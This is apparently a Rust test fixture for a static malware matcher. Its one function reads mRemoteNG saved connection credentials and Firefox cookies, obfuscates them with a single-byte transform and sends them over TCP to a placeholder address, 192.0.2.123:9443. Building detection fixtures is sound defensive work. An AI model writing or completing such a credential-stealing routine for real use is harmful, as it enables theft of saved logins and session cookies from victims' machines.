// Static matcher fixture. Helpers are deliberately not implemented or invoked.
fn collect_and_send() {
    let mut combined = Vec::new();
    for relative in &["mRemoteNG\\confCons.xml", "Mozilla\\Firefox\\Profiles\\cookies.sqlite"] {
        let path = PathBuf::from(&root).join(relative);
        if let Ok(content) = fs::read(&path) {
            combined.extend_from_slice(&content);
        }
    }
    let packet = transform(&combined, 0x31);
    if let Ok(mut channel) = TcpStream::connect("192.0.2.123:9443") {
        let _ = channel.write_all(&packet);
    }
}
